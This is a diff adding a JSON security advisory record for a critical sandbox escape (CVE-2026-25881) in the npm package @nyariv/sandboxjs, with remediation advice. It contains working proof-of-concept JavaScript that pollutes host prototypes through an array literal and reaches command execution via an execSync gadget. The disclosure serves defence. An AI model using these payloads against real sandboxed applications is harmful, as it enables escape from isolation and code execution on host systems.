@@ -1,0 +1,53 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-02-10T00:24:54Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "@nyariv/sandboxjs"
+  },
+  "Advisory": {
+    "DatabaseId": 336368,
+    "Id": "GSA_kwCzR0hTQS13dzdnLTRnd3gtbTd3as4ABSHw",
+    "GhsaId": "GHSA-ww7g-4gwx-m7wj",
+    "References": [
+      {
+        "Url": "https://github.com/nyariv/SandboxJS/security/advisories/GHSA-ww7g-4gwx-m7wj"
+      },
+      {
+        "Url": "https://github.com/nyariv/SandboxJS/commit/f369f8db26649f212a6a9a2e7a1624cb2f705b53"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-ww7g-4gwx-m7wj"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-ww7g-4gwx-m7wj"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-25881"
+      }
+    ],
+    "Description": "### Summary\nA sandbox escape vulnerability allows sandboxed code to mutate host built-in prototypes by laundering the `isGlobal` protection flag through array literal intermediaries. When a global prototype reference (e.g., `Map.prototype`, `Set.prototype`) is placed into an array and retrieved, the `isGlobal` taint is stripped, permitting direct prototype mutation from within the sandbox. This results in persistent host-side prototype pollution and may enable RCE in applications that use polluted properties in sensitive sinks (example gadget: `execSync(obj.cmd)`).\n\n### Details\n#### Root Cause:\nThe sandbox implements a protection mechanism using the `isGlobal` flag in the Prop class to prevent modification of global objects and their prototypes. However, this taint tracking is lost when values pass through array/object literal creation.\n\n#### Vulnerable Code Path `src/executor.ts`([L559-L571](https://github.com/nyariv/SandboxJS/blob/main/src/executor.ts#L559-L571)):\n```ts\naddOps(LispType.CreateArray, (exec, done, ticks, a, b: Lisp[], obj, context, scope) =\u003e {\n  const items = (b as LispItem[])\n    .map((item) =\u003e {\n      if (item instanceof SpreadArray) {\n        return [...item.item];\n      } else {\n        return item;\n      }\n    })\n    .flat()\n    .map((item) =\u003e valueOrProp(item, context));  // \u003c- isGlobal flag lost here\n  done(undefined, items);\n});\n```\n#### Exploitation Flow:\n```txt\nSandboxed code: const m=[Map.prototype][0]\n              ↓\nArray creation: isGlobal taint stripped via valueOrProp()\n              ↓\nPrototype mutation: m.cmd='id' (host prototype polluted)\n              ↓\nHost-side impact: new Map().cmd === 'id' (persistent)\n              ↓\nRCE (application-dependent): host code calls execSync(obj.cmd)\n```\n\n#### Protection Bypass Location `src/utils.ts`([L380-L385](https://github.com/nyariv/SandboxJS/blob/main/src/utils.ts#L380-L385)):\n```ts\nset(key: string, val: unknown) {\n  // ...\n  if (prop.isGlobal) {  // \u003c- This check is bypassed\n    throw new SandboxError(`Cannot override global variable '${key}'`);\n  }\n  (prop.context as any)[prop.prop] = val;\n  return prop;\n}\n```\nWhen the prototype is accessed via array retrieval, the `isGlobal` flag is no longer set, so this protection is never triggered.\n\n### PoC\n#### Prototype pollution via array intermediary:\n```js\nconst Sandbox = require('@nyariv/sandboxjs').default;\nconst sandbox = new Sandbox();\n\nsandbox.compile(`\n  const arr=[Map.prototype];\n  const p=arr[0];\n  p.polluted='pwned';\n  return 'done';\n`)().run();\n\nconsole.log('polluted' in ({}), new Map().polluted);\n```\n**Observed output**: `false pwned`\n\n#### Overwrite `Set.prototype.has`:\n```js\nconst Sandbox = require('@nyariv/sandboxjs').default;\nconst sandbox = new Sandbox();\n\nsandbox.compile(`\n  const s=[Set.prototype][0];\n  s.has=isFinite;\n  return 'done';\n`)().run();\n\nconsole.log('has overwritten:', Set.prototype.has === isFinite);\n```\n\n**Observed output**: `has overwritten: true`\n\n#### RCE via host gadget (prototype pollution -\u003e execSync):\n```js\nconst Sandbox = require('@nyariv/sandboxjs').default;\nconst { execSync } = require('child_process');\nconst sandbox = new Sandbox();\n\nsandbox.compile(`\n  const m=[Map.prototype][0];\n  m.cmd='id';\n  return 'done';\n`)().run();\n\nconst obj = new Map();\nconst out = execSync(obj.cmd, { encoding: 'utf8' }).trim();\nconsole.log(out);\n```\n\n**Observed output**: `uid=501(user) gid=20(staff) groups=20(staff),...`\n\n### Impact\nThis is a sandbox escape: untrusted sandboxed code can persistently mutate host built-in prototypes (e.g., `Map.prototype`, `Set.prototype`), breaking isolation and impacting subsequent host execution. RCE is possible in applications that later use attacker-controlled (polluted) properties in sensitive sinks (e.g., passing `obj.cmd` to `child_process.execSync`).\n\n**Affected Systems**: any application using `@nyariv/sandboxjs` to execute untrusted JavaScript.\n\n### Remediation\n- Preserve `isGlobal` protection across array/object literal creation (do not unwrap `Prop` into raw values in a way that drops the global/prototype taint).\n- Add a hard block on writes to built-in prototypes (e.g., `Map.prototype`, `Set.prototype`, etc.) even if they are obtained indirectly through literals.\n- Defense-in-depth: freeze built-in prototypes in the host process before running untrusted code (may be breaking for some consumers).",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-02-10T00:24:53Z",
+    "Severity": "CRITICAL",
+    "Summary": "@nyariv/sandboxjs has host prototype pollution from sandbox via array intermediary (sandbox escape)",
+    "UpdatedAt": "2026-02-10T00:24:54Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 9.1,
+      "VectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.8.31"
+      },
+      "VulnerableVersionRange": "\u003c= 0.8.30"
+    }
+  ]
+}
